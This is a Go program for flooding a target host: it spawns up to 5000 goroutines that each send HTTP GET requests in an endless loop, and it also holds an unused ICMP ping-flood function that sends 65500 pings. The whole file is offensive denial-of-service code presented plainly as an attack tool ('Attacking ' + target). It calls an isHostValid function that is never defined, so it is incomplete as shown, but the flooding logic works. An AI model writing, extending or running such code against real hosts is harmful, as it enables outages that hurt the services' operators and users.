package main

import (
	"fmt"
	"github.com/sparrc/go-ping"
	"net"
	"net/http"
	"os"
	"strconv"
	"sync"
)

var (
	wg sync.WaitGroup
)

const (
	threadLimit = 5000
)

func main() {
	target, threads := parseArgs()

	fmt.Println("Attacking " + target + "...")
	for i := 0; i < threads; i++ {
		wg.Add(1)

		go httpGetFlood(target)
	}
	wg.Wait()
}

func parseArgs() (target string, numbOfThreads int) {
	if len(os.Args) != 3 {
		fmt.Println("Error: Ensure you pass two arguments. Host/IP and the number of threads to spawn.")
		os.Exit(1)
	}

	target = os.Args[1]
	numbOfThreads, _ = strconv.Atoi(os.Args[2])

	if (isHostValid(target)) == false {
		fmt.Println(" Error: The host you entered is invalid.")
		os.Exit(1)
	}

	if (areNumberOfThreadsValid(numbOfThreads)) == false {
		fmt.Println("Error: The number of threads you enter exceeds the limit; ", threadLimit)
		os.Exit(1)
	}

	return target, numbOfThreads
}

func areNumberOfThreadsValid(threads int) bool {
	threads = int(threads)

	if threads > threadLimit {
		return false
	}
	return true
}

func icmpFlood(target string) {
	pinger, err := ping.NewPinger(target)

	if err != nil {
		fmt.Println("Error: Failed to ping host")
		os.Exit(1)
	}

	pinger.Count = 65500 // Packets to send
	pinger.Run()         // Blocks until complete

	wg.Done() 			// Decrement thread counter once complete
	fmt.Println("Ping Complete.")
}

func httpGetFlood(target string) {
	for {
		resp, err := http.Get(target)

		if err != nil {
			fmt.Println("Error: Failed to hit host, please enter a valid one.")
			os.Exit(1)
		}
		fmt.Println("Target Hit - ", resp.StatusCode)

		resp.Body.Close()
	}
}
